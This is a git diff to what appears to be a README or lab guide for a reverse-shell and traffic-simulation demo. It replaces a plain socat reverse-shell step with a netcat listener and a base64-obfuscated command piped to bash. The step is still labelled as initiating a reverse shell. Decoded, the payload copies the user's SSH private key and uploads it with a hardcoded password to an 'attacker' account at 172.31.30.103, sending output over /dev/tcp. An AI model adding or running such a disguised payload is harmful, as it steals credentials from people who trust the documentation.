@@ -82,7 +82,7 @@ nc -k -l 3333 &
 2. **Create a new socat tcp listener on tcp 5555**
 
 ```
-socat file:`tty`,raw,echo=0 tcp-listen:5555
+ nc -lvnp 4444
 ```
  
 3. **Optionally run traffic simulation with k6 on Terminal 2 or screen 2:**
@@ -96,7 +96,11 @@ sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
 1. **Intiate an interactive Reverse Shell***
 
 ```
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
+bash -c  'echo "IyEvYmluL2Jhc2gKCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9N
+RS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNw
+ICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAv
+c3NoX2tleXMvaWRfcnNhCiAgICBzc2hwYXNzIC1wICdhdHRhY2tlcjEyMzQ1IScgc2NwIH4vdG1w
+L3NzaF9rZXlzL2lkX3JzYSBhdHRhY2tlckAxNzIuMzEuMzAuMTAzOn4vCiAgZmkKZmkK" | base64 -d | bash > /dev/tcp/172.31.30.103/4444'
 ```
 ---
 
